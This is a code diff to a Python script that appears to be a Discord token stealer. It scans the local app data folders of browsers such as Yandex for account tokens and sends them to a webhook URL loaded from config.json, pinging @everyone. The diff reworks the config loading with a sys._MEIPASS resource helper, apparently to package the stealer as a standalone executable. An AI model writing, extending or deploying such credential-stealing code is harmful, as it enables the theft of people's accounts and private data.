@@ -1,19 +1,32 @@
 import os
 import re
 import json
-
+import sys
 from urllib.request import Request, urlopen
 
 import requests
 
-WEBHOOK_URL = ""
-PING_ME = None
-with open('./config.json') as file:
-  data = json.load(file)
-  WEBHOOK_URL =data['webhook']
-  PING_ME = data['ping']
-print(WEBHOOK_URL)
-print(type(PING_ME))
+
+def resource_path(relative_path):
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+
+    return os.path.join(base_path, relative_path)
+
+def open_file(file_path):
+    file_path = resource_path(file_path)
+    with open(file_path) as file:
+        data = json.load(file)
+        WEBHOOK_URL =data['webhook']
+        main(WEBHOOK_URL)
+
+
+
+
+
+
 
 
 def find_tokens(path):
@@ -31,7 +44,7 @@ def find_tokens(path):
                     tokens.append(token)
     return tokens
 
-def main():
+def main(WEBHOOK_URL):
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
 
@@ -45,7 +58,7 @@ def main():
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
     }
 
-    message = '@everyone' if PING_ME else ''
+    message = '@everyone'
 
     for platform, path in paths.items():
         if not os.path.exists(path):
@@ -88,5 +101,8 @@ def main():
     
 
 
+# if __name__ == '__main__':
+#     main()
 if __name__ == '__main__':
-    main()
+    WEBHOOK_URL = ""
+    open_file('config.json')
